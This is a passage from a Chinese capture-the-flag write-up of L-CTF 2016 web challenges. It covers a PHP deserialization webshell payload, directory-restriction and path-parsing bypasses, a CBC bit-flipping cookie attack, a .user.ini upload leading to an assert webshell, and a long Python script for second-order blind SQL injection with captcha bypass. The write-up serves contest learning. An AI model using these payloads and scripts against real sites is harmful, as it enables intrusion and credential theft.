<p>payload：<br/><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.l-ctf.com:<span class="number">10197</span>/ctf/upload.php?<span class="built_in">key</span>=O:<span class="symbol">%</span><span class="number">2b3</span>:<span class="string">"key"</span>:<span class="number">3</span>:{S:<span class="number">8</span>:<span class="string">"filename"</span>;s:<span class="number">2</span>:<span class="string">"ss"</span>;s:<span class="number">8</span>:<span class="string">"filedata"</span>;s:<span class="number">19</span>:<span class="string">"aaasdfasdfasdfasaaa"</span>;}</div></pre></td></tr></table></figure></p>
<p>wakeup方法被跳过了，那么写webshell进去</p>
<p>但是进去我们又遇到了问题，web目录下我们没找到flag，怎么办呢</p>
<p>绕opendir的限制！！</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">321</span>=<span class="variable">$f</span>=[];<span class="variable">$d</span>=new DirectoryIterator(<span class="string">"glob:///var/www/flag/*"</span>);var_dump(<span class="variable">$d</span>);</div></pre></td></tr></table></figure>
<h2 id="苏打学姐的网站"><a class="headerlink" href="#苏打学姐的网站" title="苏打学姐的网站"></a>苏打学姐的网站</h2><p>苏打学姐很文艺，<br/>搞了一个图片小站，但是智商经常不上线。不知是为了方便咋的、经常留一些奇怪的东西下来，来吧，砸了他这个图片站的场子！！<br/><a href="http://web.l-ctf.com:14144/" rel="external" target="_blank">http://web.l-ctf.com:14144/</a> </p>
<p>因为题不是我做的，所以我就按照队友文档中的思路来写了</p>
<p>首先我们发现<br/><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>web.l-ctf.com:<span class="number">14144</span><span class="regexp">/img.php?id=file/</span><span class="number">5253</span>d1eb29230.jpg 应该是路径解析问题，存在http:<span class="regexp">//</span>web.l-ctf.com:<span class="number">14144</span><span class="regexp">/file/</span>tips.txt</div></pre></td></tr></table></figure></p>
<p>但是怎么都读不到，后来发现虽然不知道后台怎么做的处理，但是可以双管道得到文件内容，我猜有可能是后台坐了前缀检查，payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>shimakaze.labs<span class="regexp">/lctf/</span>parse.php?id=php:<span class="regexp">//</span>resource=file<span class="regexp">/5253d1eb29230.jpg/</span>resource=file<span class="regexp">/tips.txt</span></div></pre></td></tr></table></figure>
<p>读了tips.txt，得到</p>
<p>admin.php.txt</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">Admin.php.txt</div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$Key = <span class="string">"xxxxxxxxxxxxxxxxx"</span>;</div><div class="line">$iv = <span class="string">"xxxxxxxxxxxxxxxx"</span>;</div><div class="line">$v = <span class="string">"2016niandiqijiequanguowangluoanquandasai0123456789abcdef--&gt;xdctfxdnum=2015auid=4;xdctfxdctf"</span>;</div><div class="line">$en_Result = mcrypt_encrypt(MCRYPT_RIJNDAEL_128,$Key, $v, MCRYPT_MODE_CBC, $iv);</div><div class="line">$enc = base64_encode($en_Result);</div><div class="line">$en_Data = base64_decode($_COOKIE[user]);</div><div class="line">$de_Result = mcrypt_decrypt(MCRYPT_RIJNDAEL_128,$Key, $en_Data, MCRYPT_MODE_CBC, $iv);</div><div class="line"></div><div class="line">$b = <span class="keyword">array</span>();</div><div class="line">$b = <span class="keyword">isset</span>($_COOKIE[user])?$de_Result:$enc;</div><div class="line">$num1 = substr($b,strpos($b,<span class="string">"uid"</span>)+<span class="number">4</span>,<span class="number">1</span>);</div><div class="line">$num2 = substr($b,strpos($b,<span class="string">"num"</span>)+<span class="number">4</span>,<span class="number">4</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;/br&gt;&lt;h3&gt;ID: '</span>.$num1.<span class="string">"&lt;/h3&gt;&lt;br&gt;"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($num1 == <span class="number">1</span>  &amp;&amp; $num2 == <span class="number">2016</span>){</div><div class="line">	<span class="keyword">die</span> (<span class="string">"shen mi li wu !"</span>);</div><div class="line">}</div><div class="line"><span class="keyword">else</span>{</div><div class="line">	<span class="keyword">echo</span> <span class="string">"HELLO CLIENT"</span>;</div><div class="line">}</div><div class="line">setcookie(<span class="string">"user"</span>,$enc);</div><div class="line"><span class="meta">?&gt;</span>%</div></pre></td></tr></table></figure>
<p>img.php</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]) &amp;&amp;  (strpos($_GET[<span class="string">"id"</span>],<span class="string">'jpg'</span>) !== <span class="keyword">false</span>))</div><div class="line">{</div><div class="line">    preg_match(<span class="string">"/^php:\/\/.*resource=([^|]*)/i"</span>, trim($_GET[<span class="string">"id"</span>],<span class="string">'\n'</span>), $match);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($match[<span class="number">1</span>]))</div><div class="line">        $_GET[<span class="string">"id"</span>] = $match[<span class="number">1</span>];</div><div class="line"> </div><div class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"./"</span> . $_GET[<span class="string">"id"</span>]) == <span class="keyword">false</span>)</div><div class="line">        <span class="keyword">die</span>(<span class="string">"File Not Found"</span>);</div><div class="line"></div><div class="line">    header(<span class="string">'Content-Type: image/jpg'</span>);</div><div class="line">    header(<span class="string">'Content-Length: '</span>.filesize($_GET[<span class="string">"id"</span>]));</div><div class="line">    header(<span class="string">'Content-Disposition: filename='</span>.$_GET[<span class="string">"id"</span>]);</div><div class="line">	</div><div class="line">	</div><div class="line"> </div><div class="line">	<span class="keyword">if</span> (strlen($_GET[<span class="string">"id"</span>])&gt;<span class="number">32</span>){</div><div class="line">		<span class="keyword">die</span> (<span class="string">"Too Long!!!!!"</span>);</div><div class="line">	}</div><div class="line">	<span class="keyword">else</span>{</div><div class="line">		$data = file_get_contents($_GET[<span class="string">"id"</span>]);</div><div class="line">		<span class="keyword">echo</span> $data;</div><div class="line">	}	</div><div class="line">}</div><div class="line"><span class="keyword">else</span></div><div class="line">{</div><div class="line">	<span class="keyword">echo</span> <span class="string">"File Not Found"</span>;</div><div class="line">}</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>懂的人看一眼就能明白，cbc字节反转攻击，原理就不多说了，之前三个白帽遇到过，hctf2015也曾经出过</p>
<p>核心在这里<br/><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">$num1</span> = <span class="built_in">substr</span>(<span class="variable">$b</span>,<span class="built_in">strpos</span>(<span class="variable">$b</span>,<span class="string">"uid"</span>)+4,1);</div><div class="line"><span class="variable">$num2</span> = <span class="built_in">substr</span>(<span class="variable">$b</span>,<span class="built_in">strpos</span>(<span class="variable">$b</span>,<span class="string">"num"</span>)+4,4);</div></pre></td></tr></table></figure></p>
<p>只要构造后16位中的13bytes为uid=1num=2016<br/>就可以成功通过判断</p>
<p>跑一跑就好了，然后到了文件上传</p>
<p>上传一个.user.ini<br/><img alt="" src="./L-ctf2016 Writeup  LoRexxar's Blog/1.jpg"/></p>
<p>上传一个同名文件</p>
<p><img alt="" src="./L-ctf2016 Writeup  LoRexxar's Blog/2.png"/></p>
<p>get shell</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//web.l-ctf.com:14144/upload_12b1d89eb3a43eb6220b5952a5a13785/upload/index.php?a=assert</span></div><div class="line"><span class="symbol"></span></div><div class="line">Post: fuckddog=phpinfo();</div></pre></td></tr></table></figure>
<h2 id="Headpic"><a class="headerlink" href="#Headpic" title="Headpic"></a>Headpic</h2><p>这题基本做了我一个下午一个晚上…最气的是这题的第一第二步完全分离，所以我们做了第二步后，在flag前面等了好久，一直到tips放了才反应过来是做错了顺序…只可惜本来是能拿一血，最后堪堪拿下3血┑(￣Д ￣)┍…</p>
<h3 id="二次注入"><a class="headerlink" href="#二次注入" title="二次注入"></a>二次注入</h3><p>看到这个提示的时候我一直是蒙蔽的，因为在我的观点里，题目应该是ssrf…</p>
<p>仔细分析题目逻辑：</p>
<p>注册（insert）-&gt;登陆(select)-&gt;登陆后给一个头像地址（存在？select?还是注册就默认插入了）-&gt;修改头像（update）</p>
<p>知道做出来我都不能肯定是不是存在第三部分，但是测试发现第四步确实存在，而且update时的where条件是username = $user,这里存在二次注入。</p>
<p>那么问题来了…这里的判断条件必须请求修改后的头像内容，来判断盲注请求是否成功，也就是说，每次注入我们都必须请求4次，还是盲注，当然这里还有个问题就是验证码的问题</p>
<ul>
<li>绕过验证码</li>
</ul>
<p>这里还是蓝猫师傅抬了我一手，当时我正在研究绕过验证码的，蓝猫师傅告诉我，如果你不带session去登陆注册的话，验证码的判定就没用了。</p>
<p>这里也很好理解，一般写代码的人只考滤正常人的请求方式，</p>
<p>代码一般长这样<br/><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)){</div><div class="line">	设置session，</div><div class="line">	然后跳回</div><div class="line">}</div></pre></td></tr></table></figure></p>
<p>这样不带着session去登陆注册就可以了。</p>
<p>下面就是编写脚本时间了，由于和平时的盲注不一样，我自己写的工具用不上，所以没办法，我只能自己又写了一个脚本，这样没有二分法，所以每次个字母都要100次请求，所以全程注入都在只能改脚本，跳过各种单词，还算友好的是并没有修改一些单词，还可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">code</span><span class="params">(s)</span>:</span></div><div class="line">	url = <span class="string">"http://web.l-ctf.com:55533/verify.php"</span></div><div class="line">	cookies = {<span class="string">"PHPSESSID"</span>: <span class="string">"ljf888c57d6pd9qrcltgrsadd2"</span>}</div><div class="line"></div><div class="line">	code = s.get(url, cookies=cookies)</div><div class="line">	<span class="keyword">with</span> open(<span class="string">"code.png"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> ff:</div><div class="line">		ff.write(code.content)</div><div class="line"></div><div class="line">	img = Image.open(<span class="string">"code.png"</span>)</div><div class="line">	code_string = pytesseract.image_to_string(img)</div><div class="line"></div><div class="line">	<span class="keyword">print</span> code_string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(payload)</span>:</span></div><div class="line"></div><div class="line">	url1 = <span class="string">"http://web.l-ctf.com:55533/check.php"</span></div><div class="line"></div><div class="line">	data = {<span class="string">"user"</span>: payload, <span class="string">"pass"</span>: <span class="string">"dsa"</span>, <span class="string">"typer"</span>: <span class="string">"0"</span>, <span class="string">"register"</span>: <span class="string">"%E6%B3%A8%E5%86%8C"</span>}</div><div class="line"></div><div class="line">	r = requests.post(url1,data = data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(payload)</span>:</span></div><div class="line"></div><div class="line">	s = requests.Session()</div><div class="line">	url1 = <span class="string">"http://web.l-ctf.com:55533/check.php"</span></div><div class="line">	url2 = <span class="string">"http://web.l-ctf.com:55533/save.php"</span></div><div class="line">	url3 = <span class="string">"http://web.l-ctf.com:55533/ucenter.php"</span></div><div class="line"></div><div class="line">	data = {<span class="string">"user"</span>: payload, <span class="string">"pass"</span>: <span class="string">"dsa"</span>, <span class="string">"typer"</span>: <span class="string">"0"</span>, <span class="string">"login"</span>: <span class="string">"%E7%99%BB%E9%99%86"</span>}</div><div class="line">	r = s.post(url1, data = data)</div><div class="line">	Session = r.headers[<span class="string">'Set-Cookie'</span>]</div><div class="line"></div><div class="line">	data2 = {<span class="string">"headpic"</span>:<span class="string">"http://web.l-ctf.com:55533@115.28.78.16/ddog.php"</span>}</div><div class="line">	r = s.post(url2, data = data2, cookies={<span class="string">"PHPSESSID"</span>: Session[<span class="number">10</span>:<span class="number">-8</span>]})</div><div class="line"></div><div class="line">	r = s.get(url3, cookies={<span class="string">"PHPSESSID"</span>: Session[<span class="number">10</span>:<span class="number">-8</span>]})</div><div class="line"></div><div class="line">	bs0bj = BeautifulSoup(r.text, <span class="string">"lxml"</span>)</div><div class="line">	content = base64.b64decode(bs0bj.img[<span class="string">'src'</span>][<span class="number">23</span>:])</div><div class="line"></div><div class="line">	<span class="keyword">if</span> len(content) &gt; <span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(payload)</span>:</span></div><div class="line"></div><div class="line">	payload = payload.replace(<span class="string">" "</span>, <span class="string">"/**/"</span>)</div><div class="line">	<span class="keyword">print</span> payload</div><div class="line">	register(payload)</div><div class="line">	<span class="keyword">if</span> login(payload):</div><div class="line">		<span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ppayload</span><span class="params">()</span>:</span></div><div class="line">	<span class="comment"># for i in xrange(30):</span></div><div class="line">	<span class="comment"># 	payload = "nishigeshenmegui' or ((SELECT COUNT(*) from information_schema.SCHEMATA limit 0,1)&gt;" + str(i) + ")#"</span></div><div class="line"></div><div class="line">	<span class="comment"># 	if test(payload):</span></div><div class="line">	<span class="comment"># 		database_number = i</span></div><div class="line">	<span class="comment"># 	 	break</span></div><div class="line">		</div><div class="line">	<span class="comment"># print "database_number:" + str(database_number)</span></div><div class="line"></div><div class="line"></div><div class="line">	database_number = <span class="number">2</span></div><div class="line">	<span class="comment"># for i in range(1,2):</span></div><div class="line">	<span class="comment"># 	for j in xrange(50):</span></div><div class="line">	<span class="comment"># 		payload = "nishigeshenmegui' or ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + str(i) + ",1)&gt;" + str(j) + ")#"</span></div><div class="line"></div><div class="line">	<span class="comment"># 		if test(payload):</span></div><div class="line">	<span class="comment"># 			database_length = j</span></div><div class="line">	<span class="comment"># 		 	break</span></div><div class="line"></div><div class="line">	<span class="comment"># 	print "[*]dababase_length: "+ str(database_length)</span></div><div class="line"></div><div class="line">	<span class="comment"># 	database = ""</span></div><div class="line">	<span class="comment"># 	for j in xrange(database_length):</span></div><div class="line">	<span class="comment"># 		for r in xrange(7):</span></div><div class="line">	<span class="comment"># 			pass</span></div><div class="line">	<span class="comment"># 		for k in range(30,130):</span></div><div class="line">	<span class="comment"># 			payload = "nishigeshenmegui' or ((select ascii(mid((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit " + str(i) + ",1),"+ str(j) +",1)))&gt;" + str(k) + ")#"</span></div><div class="line"></div><div class="line">	<span class="comment"># 			if test(payload):</span></div><div class="line">	<span class="comment"># 				database += chr(k)</span></div><div class="line">	<span class="comment"># 			 	break</span></div><div class="line"></div><div class="line">	<span class="comment"># 	print "[*]database:"+database</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="comment"># for i in xrange(30):</span></div><div class="line">	<span class="comment"># 	payload = "nishigeshenmegui' or ((SELECT COUNT(*) from information_schema.TABLES where TABLE_SCHEMA = 'web_200' limit 0,1)&gt;" + str(i) + ")#"</span></div><div class="line"></div><div class="line">	<span class="comment"># 	if test(payload):</span></div><div class="line">	<span class="comment"># 		table_number = i</span></div><div class="line">	<span class="comment"># 	 	break</span></div><div class="line">		</div><div class="line">	<span class="comment"># print "table_number:" + str(table_number)</span></div><div class="line">	<span class="comment"># table_number = 2</span></div><div class="line"></div><div class="line">	<span class="comment"># for i in range(0,table_number):</span></div><div class="line">	<span class="comment"># 	# for j in xrange(50):</span></div><div class="line"></div><div class="line">		<span class="comment"># 	payload = "nishigeshenmegui' or ((SELECT length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'web_200'  limit " + str(i) + ",1)&gt;" + str(j) + ")#"</span></div><div class="line"></div><div class="line">		<span class="comment"># 	if test(payload):</span></div><div class="line">		<span class="comment"># 		table_length = j</span></div><div class="line">		<span class="comment"># 	 	break</span></div><div class="line"></div><div class="line">		<span class="comment"># print "[*]table_length: "+ str(table_length)</span></div><div class="line"></div><div class="line">		<span class="comment"># table_length = 14</span></div><div class="line">		<span class="comment"># table = ""</span></div><div class="line">		<span class="comment"># for j in range(11,table_length):</span></div><div class="line">		<span class="comment"># 	for k in range(50,130):</span></div><div class="line">		<span class="comment"># 		payload = "nishigeshenmegui' or ((select ascii(mid((SELECT TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = 'web_200'  limit " + str(i) + ",1),"+ str(j + 1) +",1)))&gt;" + str(k) + ")#"</span></div><div class="line"></div><div class="line">		<span class="comment"># 		if test(payload):</span></div><div class="line">		<span class="comment"># 			table += chr(k)</span></div><div class="line">		<span class="comment"># 			print table</span></div><div class="line">		<span class="comment"># 		 	break</span></div><div class="line"></div><div class="line">	<span class="comment"># 	# print "[*]table:" + table</span></div><div class="line">	<span class="comment"># for i in xrange(30):</span></div><div class="line">	<span class="comment"># 	payload = "nishigeshenmegui' or ((SELECT COUNT(*) from information_schema.COLUMNS where TABLE_SCHEMA = 'web_200' &amp;&amp; TABLE_NAME = 'flag_admin_233' limit 0,1)&gt;" + str(i) + ")#"</span></div><div class="line"></div><div class="line">	<span class="comment"># 	if test(payload):</span></div><div class="line">	<span class="comment"># 		conlum_number = i</span></div><div class="line">	<span class="comment"># 	 	break</span></div><div class="line"></div><div class="line">	<span class="comment"># conlum_number = 3</span></div><div class="line">	<span class="comment"># print "conlum_number:" + str(conlum_number)</span></div><div class="line"></div><div class="line">	<span class="comment"># for i in range(2,conlum_number):</span></div><div class="line">	<span class="comment"># 	for j in xrange(50):</span></div><div class="line">	<span class="comment"># 		if i == 2:</span></div><div class="line">	<span class="comment"># 			conlum_length = 4</span></div><div class="line">	<span class="comment"># 			break</span></div><div class="line"></div><div class="line">	<span class="comment"># 		payload = "nishigeshenmegui' or ((SELECT length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'web_200'  limit " + str(i) + ",1)&gt;" + str(j) + ")#"</span></div><div class="line"></div><div class="line">	<span class="comment"># 		if test(payload):</span></div><div class="line">	<span class="comment"># 			conlum_length = j</span></div><div class="line">	<span class="comment"># 		 	break</span></div><div class="line"></div><div class="line">	<span class="comment"># 	print "[*]conlum_length: "+ str(conlum_length)</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="comment"># 	column = ""</span></div><div class="line">	<span class="comment"># 	for j in range(conlum_length):</span></div><div class="line"></div><div class="line">	<span class="comment"># 		for k in range(90,130):</span></div><div class="line">	<span class="comment"># 			payload = "nishigeshenmegui' or ((select ascii(mid((SELECT COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA = 'web_200'  limit " + str(i) + ",1),"+ str(j + 1) +",1)))&gt;" + str(k) + ")#"</span></div><div class="line"></div><div class="line">	<span class="comment"># 			if test(payload):</span></div><div class="line">	<span class="comment"># 				column += chr(k)</span></div><div class="line">	<span class="comment"># 				print column</span></div><div class="line">	<span class="comment"># 			 	break</span></div><div class="line"></div><div class="line">	<span class="comment"># 	print "[*]column:" + column</span></div><div class="line"></div><div class="line">	<span class="comment"># for i in xrange(30):</span></div><div class="line">	<span class="comment"># 	payload = "nishigeshenmegui' or ((SELECT COUNT(*) from flag_admin_233 limit 0,1)&gt;" + str(i) + ")#"</span></div><div class="line"></div><div class="line">	<span class="comment"># 	if test(payload):</span></div><div class="line">	<span class="comment"># 		content_number = i</span></div><div class="line">	<span class="comment"># 	 	break</span></div><div class="line"></div><div class="line">	<span class="comment"># print "content_number:" + str(content_number)</span></div><div class="line"></div><div class="line">	content_number = <span class="number">1</span></div><div class="line"></div><div class="line">	number =  [<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>]</div><div class="line"></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,content_number):</div><div class="line">		<span class="comment"># for j in xrange(50):</span></div><div class="line"></div><div class="line">		<span class="comment"># 	payload = "nishigeshenmegui' or ((SELECT length(pass) from flag_admin_233 limit " + str(i) + ",1)&gt;" + str(j) + ")#"</span></div><div class="line"></div><div class="line">		<span class="comment"># 	if test(payload):</span></div><div class="line">		<span class="comment"># 		content_length = j</span></div><div class="line">		<span class="comment"># 	 	break</span></div><div class="line"></div><div class="line">		content_length =<span class="number">32</span></div><div class="line"></div><div class="line">		<span class="keyword">print</span> <span class="string">"[*]content_length: "</span>+ str(content_length)</div><div class="line"></div><div class="line"></div><div class="line">		content = <span class="string">""</span></div><div class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(content_length):</div><div class="line"></div><div class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> number:</div><div class="line">				payload = <span class="string">"nishigeshenmegui' or ((select ascii(mid((SELECT pass from flag_admin_233  limit "</span> + str(i) + <span class="string">",1),"</span>+ str(j + <span class="number">1</span>) +<span class="string">",1)))&gt;"</span> + str(k) + <span class="string">")#"</span></div><div class="line"></div><div class="line">				<span class="keyword">if</span> test(payload):</div><div class="line">					content += chr(k)</div><div class="line">					<span class="keyword">print</span> content</div><div class="line">				 	<span class="keyword">break</span></div><div class="line"></div><div class="line">		<span class="keyword">print</span> <span class="string">"[*]content:"</span> + content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	s = requests.Session()</div><div class="line"></div><div class="line">	<span class="comment"># code(s)</span></div><div class="line">	ppayload()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
<p>注入得到</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">数据库名web_200</div><div class="line">表数量<span class="number">2</span>个</div><div class="line">table</div><div class="line">flag_admin_233</div><div class="line"><span class="keyword">User</span></div><div class="line"></div><div class="line"><span class="title">Flag_admin_233</span></div><div class="line">Id， admin， pass</div><div class="line"></div><div class="line"></div><div class="line">admin******</div><div class="line"></div><div class="line">Admin，<span class="number">1</span>admin2016</div></pre></td></tr></table></figure>
<h3 id="ssrf"><a class="headerlink" href="#ssrf" title="ssrf"></a>ssrf</h3><p>得到用户名和密码后，发现admin.php并不能登陆上去，再robots.txt我们得到了提示</p>
